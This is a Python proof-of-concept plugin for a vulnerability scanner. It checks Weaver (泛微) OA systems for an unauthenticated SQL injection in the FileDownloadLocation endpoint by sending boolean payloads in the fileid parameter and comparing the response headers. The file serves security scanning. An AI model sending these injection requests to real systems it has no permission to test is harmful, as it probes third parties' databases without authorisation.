# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'weaver_0000'  # 平台漏洞编号，留空
    name = '泛微某系统通用型SQL注入(无需登录)'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-17'  # 漏洞公布时间
    desc = '''
        作为协同管理软件行业的领军企业，泛微有业界优秀的协同管理软件产品。在企业级移动互联大潮下，泛微发布了全新的以“移动化 社交化 平台化 云端化”四化为核心的全一代产品系列，包括面向大中型企业的平台型产品e-cology、面向中小型企业的应用型产品e-office、面向小微型企业的云办公产品eteams，以及帮助企业对接移动互联的移动办公平台e-mobile和帮助快速对接微信、钉钉等平台的移动集成平台等等。
        泛微某系统通用型SQL注入，无需登录直接注入 /weaver/weaver.email.FileDownloadLocation?download=1&fileid=
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=76418'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1f0470ba-fd1f-483a-94d9-4d00749e15b1'
    author = '国光'  # POC编写者
    create_date = '2018-05-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            true_url = '{target}'.format(
                target=self.target) + '/weaver/weaver.email.FileDownloadLocation?download=1&fileid=-2%20or%201=1'
            false_url = '{target}'.format(
                target=self.target) + '/weaver/weaver.email.FileDownloadLocation?download=1&fileid=-2%20or%201=2'

            code1, head1, res1, errcode1, _ = hh.http(true_url)
            code2, head2, res2, errcode2, _ = hh.http(false_url)

            if 'attachment' in head1 and 'attachment' not in head2:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
